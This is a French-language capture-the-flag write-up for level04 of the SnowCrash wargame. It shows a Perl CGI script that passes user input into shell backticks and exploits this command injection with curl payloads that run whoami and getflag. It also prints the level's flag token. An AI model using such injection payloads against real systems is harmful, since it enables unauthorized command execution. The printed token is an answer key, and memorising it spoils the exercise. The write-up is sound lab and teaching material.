# Level04

## level04.pl

```sh
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
level04@SnowCrash:~$ cat level04.pl
```

```pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Ce script est un script CGI (Common Gateway Interface) écrit en Perl. Il s'exécute en dehors d'une machine distante comme un serveur Web. Ce script s'exécute via un navigateur Web, prend les paramètres de requête GET ou POST et appelle la fonction x().

La fonction x() stocke la valeur passée en paramètre dans la variable $y et imprime la variable $y via la commande echo. Où 2>&1 redirige la sortie d'erreur standard vers la sortie standard.

Ainsi, le script level04.pl génère les paramètres transmis par l'utilisateur et on peut transmettre des commandes shell arbitraires aux paramètres. Cela peut conduire à des vulnérabilités d'injection de commandes.

##

Paramètres d'envoi

```sh
curl localhost:4747/?x=\`CMD\`
```

```sh
level04@SnowCrash:~$ curl "http://localhost:4747?x=\`whoami\`"
flag04
level04@SnowCrash:~$ curl "http://localhost:4747?x=\`getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$ su level05
Password:
level05@SnowCrash:~$
```
